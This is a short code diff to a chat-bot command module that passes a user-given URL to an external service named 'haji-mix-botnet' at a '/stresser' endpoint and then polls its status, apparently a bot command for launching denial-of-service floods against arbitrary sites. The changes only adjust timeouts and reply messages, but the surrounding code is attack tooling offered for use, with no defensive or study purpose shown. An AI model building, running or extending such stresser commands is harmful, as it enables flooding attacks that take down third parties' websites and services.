@@ -26,11 +26,11 @@ module.exports["run"] = async ({ args, chat, font }) => {
 
     try {
         const response = await axios.get(`https://haji-mix-botnet.onrender.com/stresser?url=${encodeURIComponent(url)}`, {
-            timeout: 30000
+            timeout: 60000
         });
 
         initiate.unsend();
-        chat.reply(thin(response.data.message));
+        chat.reply(thin(response.data.message || status_msg));
 
         const checkInterval = setInterval(async () => {
             try {
@@ -50,8 +50,7 @@ module.exports["run"] = async ({ args, chat, font }) => {
 
         setTimeout(() => {
             clearInterval(checkInterval);
-            chat.reply(thin("10 minutes passed, stopping the check status for " + url));
-        }, 600000);
+        }, 60000);
 
     } catch (err) {
         if (err.code === 'ECONNABORTED') {
